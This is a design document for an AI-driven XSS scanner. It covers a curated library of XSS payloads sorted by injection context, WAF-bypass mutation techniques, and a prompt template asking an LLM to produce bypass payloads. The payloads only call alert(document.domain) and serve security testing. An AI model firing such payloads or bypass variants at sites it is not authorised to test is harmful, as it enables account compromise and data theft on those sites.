# Payload Intelligence Improvements Design

**Date:** 2026-03-20
**Status:** Draft

## Goal

Three interconnected improvements to the payload generation pipeline, unified by a new curated seed library:

1. **Golden Seed Library** — 20–25 hand-curated XSS payloads, organized by context, drawn from a decade of public research. Replaces cold/contaminated seed sources everywhere in the pipeline.
2. **Fast Mode Rework** — Replace one timed-out 50-payload cold call with 7 parallel context-specific AI calls, each seeded from the golden library + explicit mutation technique instructions.
3. **Normal Mode T1 Early Exit** — If 0/N candidates reflect via HTTP pre-rank, skip the 1944-candidate Playwright loop and escalate directly to T3-scout.
4. **Deep Mode Stored Path** — When probe detects stored XSS (`discovery_style="stored_get"`), skip T1's 1944 Cartesian payloads and fire a targeted set of 20–25 universal stored payloads instead, then escalate to AI with stored context.

---

## Background

### Why the golden seed library matters

Two problems currently limit payload quality:

- **Fast mode** calls `generate_fast_batch()` — one API request generating 50 payloads from scratch with no seed examples. The Claude CLI times out at 180s. The fallback (Codex) refuses to generate exploits. Output when it does work is application-agnostic noise with no structural variety.
- **Normal mode T3-scout** draws seeds from `SeedPool` (`~/.axss/seed_pool.jsonl`), which accumulates whatever payloads happened to survive past scans. This is contamination-prone and empty on first use.

GenXSS (arXiv 2504.08176) showed that 4 hand-crafted seed payloads + a technique list produces 264 diverse, WAF-bypassing outputs in a single LLM pass. Our current approach gives the model nothing to start from. The golden library fixes this at the source.

### Why T1 early exit matters

Normal mode's pre-rank fires 10 HTTP checks before T1. If 0/10 reflect, the filter is clearly stripping everything — but the code fires all 1944 Playwright candidates anyway, burning the 300s worker timeout. Labs 3 (HTML Filter Bypass) and 4 (Stored) both hit this path and time out before T3-scout ever runs.

### Why stored deep path matters

When `probe_url()` detects `discovery_style="stored_get"`, the worker still dispatches all 1944 T1 Cartesian-product candidates through Playwright. Each stored candidate requires Playwright to: inject the payload, then navigate to a separate follow-up URL to check for execution — roughly 2× the Playwright work per candidate. 1944 candidates × 2 navigations = guaranteed timeout. Stored XSS is also typically less filtered than reflected (no WAF between DB write and render), so simple universal payloads succeed where complex WAF-bypass payloads are overkill.

---

## Architecture

```
ai_xss_generator/
  payloads/
    __init__.py
    golden_seeds.py       ← NEW: curated seed library
  models.py               ← MODIFY: generate_fast_seeded_batch()
  active/
    worker.py             ← MODIFY: T1 early exit + stored branch
```

---

## Component 1: Golden Seed Library

**File:** `ai_xss_generator/payloads/golden_seeds.py`

### Payload selection criteria

- Known to execute in modern browsers against real applications (sourced from PortSwigger XSS cheat sheet, dalfox's payload library, public bug bounty writeups, GenXSS/GAXSS research)
- Maximum structural diversity — no two seeds share the same HTML element + event handler combination
- Favor HTML5 semantic elements (`<details>`, `<svg>`, `<video>`) over classic `<script>` (more WAF-resilient by default)
- Each payload calls `alert(document.domain)` or `confirm(document.domain)` (consistent with the rest of the tool)
- Polyglots included to cover ambiguous injection points

### Structure

```python
# Organized by context_type (matches probe.py ReflectionContext.context_type values)
GOLDEN_SEEDS: dict[str, list[str]] = {
    "html_body": [
        "<details open ontoggle=alert(document.domain)>",
        "<svg/onload=alert(document.domain)>",
        "<img src=x onerror=alert(document.domain)>",
        "<video><source onerror=alert(document.domain)></video>",
        "<body onload=alert(document.domain)>",
    ],
    "html_attr_event": [
        "\" autofocus onfocus=alert(document.domain) x=\"",
        "\" onmouseover=alert(document.domain) x=\"",
        "' onerror=alert(document.domain) x='",
        "\" onpointerenter=alert(document.domain) x=\"",
    ],
    "html_attr_url": [
        "javascript:alert(document.domain)",
        "javascript://%0aalert(document.domain)",
        "data:text/html,<script>alert(document.domain)</script>",
    ],
    "js_string_dq": [
        "\"-alert(document.domain)-\"",
        "\";alert(document.domain)//",
        "\\u0022;alert(document.domain)//",
    ],
    "js_string_sq": [
        "'-alert(document.domain)-'",
        "';alert(document.domain)//",
        "\\u0027;alert(document.domain)//",
    ],
    "js_template": [
        "${alert(document.domain)}",
        "`;alert(document.domain)//`",
    ],
    "url_fragment": [
        "#\"><img src=x onerror=alert(document.domain)>",
        "#javascript:alert(document.domain)",
    ],
    "polyglot": [
        "jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert(document.domain))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>\x3e",
        "\"><svg/onload=alert(document.domain)>'\"><img src=x onerror=alert(document.domain)>",
    ],
}

# Universal stored XSS seeds — simple, clean, no WAF-bypass complexity needed
# Used by deep mode when probe.discovery_style == "stored_get"
STORED_UNIVERSAL: list[str] = [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(document.domain)>",
    "<svg onload=alert(document.domain)>",
    "<details open ontoggle=alert(document.domain)>",
    "<body onload=alert(document.domain)>",
    "<video><source onerror=alert(document.domain)></video>",
    "'\"><script>alert(document.domain)</script>",
    "'\"><img src=x onerror=alert(document.domain)>",
]
```

### Public API

```python
def seeds_for_context(context_type: str, n: int = 3) -> list[str]:
    """Return up to n golden seeds for context_type. Falls back to polyglots."""

def all_seeds_flat() -> list[str]:
    """Return all seeds deduplicated (for fast mode's context-agnostic use)."""

def stored_universal_payloads() -> list[str]:
    """Return the universal stored XSS payload list."""
```

### Payload curation process (for implementation)

During implementation, the implementer must research and populate the library from:
1. PortSwigger XSS cheat sheet (https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
2. Dalfox's `internal/payload/xss.go` — especially `GetHTMLPayload()` and `GetAttrPayload()`
3. Known public WAF bypass collections (2018–2025)
4. Ensure 100% structural uniqueness — no two payloads use the same element+handler combination

---

## Component 2: Fast Mode Rework

**File:** `ai_xss_generator/models.py`

### New function: `generate_fast_seeded_batch`

Replaces `generate_fast_batch` in the fast mode scan path.

```python
def generate_fast_seeded_batch(
    cloud_model: str,                    # required — matches generate_fast_batch convention
    waf_hint: str | None = None,
    count_per_context: int = 8,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    request_timeout_seconds: int = 600,  # 10 min — 7 parallel calls, each ~2-5 min
) -> list[PayloadCandidate]:
```

`cloud_model` is required (positional first arg), matching the convention of `generate_fast_batch` and every other generation function in `models.py`.

**Behavior:**
1. For each of 7 context types: build a context-specific prompt with 2–3 golden seeds + technique list
2. Fire all 7 API calls concurrently via `asyncio.gather` (or `concurrent.futures.ThreadPoolExecutor` if async is not used elsewhere)
3. Merge and deduplicate results → ~56 payloads total
4. Return `list[PayloadCandidate]` with correct context tags

### Per-call prompt structure

```
System: You are an expert offensive-security researcher specialising in XSS.
        Return strict JSON only — no markdown, no commentary.

User:
Generate {count_per_context} XSS payloads for the "{context_type}" injection context.

Context description: {one-sentence description of what this context looks like in HTML}

Seed payloads (these are confirmed working — use them as mutation starting points):
{seed_1}
{seed_2}
{seed_3}

Mutation techniques to apply independently across your outputs:
- Keyword case variation: oNlOaD, ScRiPt, AlErT
- HTML entity encoding of event keywords: &#111;&#110;&#108;&#111;&#97;&#100;
- URL / double-URL encoding: %6f%6e, %256f%256e
- Whitespace substitution: %09 %0a %0d /**/ between attributes
- Alternative event handlers compatible with this context
- Alternative JS calls: alert() confirm() prompt() (confirm)`` [8].find(confirm)
- Comment injection between tag parts: <!-- --> /**/
- Null byte insertion: %00 between tag/event keywords
{waf_specific_instructions if waf_hint}

Return JSON: {"payloads": [{"payload": "...", "title": "...", "tags": ["context:{context_type}", "bypass:..."], "bypass_family": "...", "risk_score": 1-10}]}
Generate exactly {count_per_context} payloads.
```

### Backward compatibility

`generate_fast_batch` is retained unchanged. The scan path in `worker.py` (fast mode branch) is updated to call `generate_fast_seeded_batch` instead.

### User-facing output

At scan start in fast mode, before workers are dispatched:
```
[*] Fast mode: generating payload library (7 context-specific batches)…
```
This prints once per scan, not per URL.

### Timeout

`request_timeout_seconds=600` (10 minutes). The 7 calls run concurrently so wall time is ~max(individual call times), typically 2–5 minutes.

---

## Component 3: Normal Mode T1 Early Exit

**File:** `ai_xss_generator/active/worker.py`

### Change

After the pre-rank block (currently around line 1392), add:

```python
# Inside the existing try block in the pre-rank section:
_reflect_count = len(_ranked)  # _ranked = [p for p, hit in zip(...) if hit]

# Immediately after computing _reflect_count, still inside the try:
if _reflect_count == 0 and len(_check_candidates) > 0:
    _v_steps.append("T1:skip(0-reflect)")
    tier1_candidates = []   # T1 loop will be a no-op
```

**Placement:** This must go **inside** the existing `try` block in the pre-rank section, after `_ranked` is computed but before the final `tier1_candidates = _ranked + _non_reflecting + tier1_candidates[10:]` reassignment. Placing it after the `try/except` would leave `_reflect_count` undefined if the `try` raised an exception.

### -vv output

Token added to `_v_steps`: `T1:skip(0-reflect)` — visible in the `-v` summary line as part of the tier chain.

### T3-scout seeding

`generate_normal_scout` currently receives top seeds from `SeedPool.select_seeds()`. When T1 was skipped (no prior failures to learn from), it should also receive context-appropriate golden seeds as fallback:

```python
# _tier1_failed_payloads is the existing list[str] of payloads that were
# fired and did not confirm (populated during T1 loop).
# When T1 was skipped entirely, this list is empty — fall back to golden seeds.
if not _tier1_failed_payloads:
    from ai_xss_generator.payloads.golden_seeds import seeds_for_context
    _t3_scout_seeds = seeds_for_context(context_type, n=3)
else:
    _t3_scout_seeds = _tier1_failed_payloads[:3]
# Pass _t3_scout_seeds to generate_normal_scout() as the seeds= argument.
```

---

## Component 4: Deep Mode Stored Path

**File:** `ai_xss_generator/active/worker.py`

### Detection

In the context loop, after probe result is resolved per param, check:

```python
_is_stored = (
    probe_result is not None
    and probe_result.discovery_style == "stored_get"
)
```

### New stored branch

When `_is_stored` is True for a context:

1. **Skip T1 Cartesian product** — set `tier1_candidates = []`
2. **Load universal stored payloads** from `stored_universal_payloads()`
3. **Fire via executor** using the existing `executor.fire(..., sink_url=sink_url)` call pattern. The executor already handles follow-up URL navigation when `sink_url` is non-None (this is how deep mode's stored sweep already works — the executor navigates to `sink_url` after injecting the payload, then checks for execution). The `discovery_style` field is **not** read by the executor; routing is entirely driven by `sink_url`. If `sink_url` is None and the stored detection came from a crawled-page hit, the implementer must determine the follow-up URL from the probe result's context (the crawled page URL where the canary appeared — this may require threading through an additional parameter).
4. **If any confirms** → mark context done, record finding
5. **If all miss** → build stored-specific prompt and call `generate_deep_stored()` (new function in `models.py`) with:
   - `param_name`, `context_type`
   - `follow_up_url` (the URL where stored content renders)
   - Top 3 universal payloads that were tried (as negative examples)
   - Request 10 targeted payloads

### -vv output

New `_v_steps` tokens:
- `stored:universal-CONFIRMED` — one of the 20-25 universal payloads confirmed
- `stored:universal-miss` — all universal payloads missed, escalating to AI
- `stored:AI-CONFIRMED` — AI-generated payload confirmed
- `stored:AI-miss` — AI also missed

### Timeout

Deep mode worker timeout stays at 300s for reflected paths. For stored paths (`_is_stored == True`), timeout is extended to 600s. This is checked before the context loop begins.

---

## Files Changed Summary

| File | Change |
|------|--------|
| `ai_xss_generator/payloads/__init__.py` | Create (empty) |
| `ai_xss_generator/payloads/golden_seeds.py` | Create — curated seed library |
| `ai_xss_generator/models.py` | Add `generate_fast_seeded_batch()`, add `generate_deep_stored()` |
| `ai_xss_generator/active/worker.py` | Add T1 early exit; add stored branch in deep mode context loop |
| `tests/test_golden_seeds.py` | Create — unit tests for seed library API |
| `tests/test_fast_seeded_batch.py` | Create — unit tests for `generate_fast_seeded_batch()` |
| `tests/test_active_worker_order.py` | Add tests for T1 early exit and stored branch |

---

## Testing

### Golden seeds library
- All 7 context keys present
- `seeds_for_context` returns ≤ n entries; falls back to polyglots for unknown context
- `all_seeds_flat` returns deduplicated list
- `stored_universal_payloads` returns non-empty list
- No payload appears twice (dedup check)

### Fast mode rework
- `generate_fast_seeded_batch` fires exactly 7 calls (one per context)
- Each call receives seeds matching that context
- Timeout parameter is passed through (600s)
- Returns merged `list[PayloadCandidate]` with correct context tags
- WAF hint appended to prompt when `waf_hint` is set
- Test with mocked API calls (no real network)

### T1 early exit
- When pre-rank returns 0 reflect: `tier1_candidates` is empty, T1 loop not entered, `T1:skip(0-reflect)` in `_v_steps`
- When pre-rank returns >0 reflect: T1 fires normally
- T3-scout receives golden seeds when `_tier1_failed_payloads` is empty

### Stored branch
- When `discovery_style == "stored_get"`: T1 candidates empty, universal payloads fired
- When universal payloads all miss: `generate_deep_stored` called with correct args
- Timeout is 600s for stored contexts

---

## Out of Scope

- Normal mode stored XSS detection (T0 is reflected-only by design — stored is deep-only)
- POST worker stored path (same deferral as in previous plan)
- `--interesting` crawl/ai implementation
- WAF JS-challenge fallback for T0
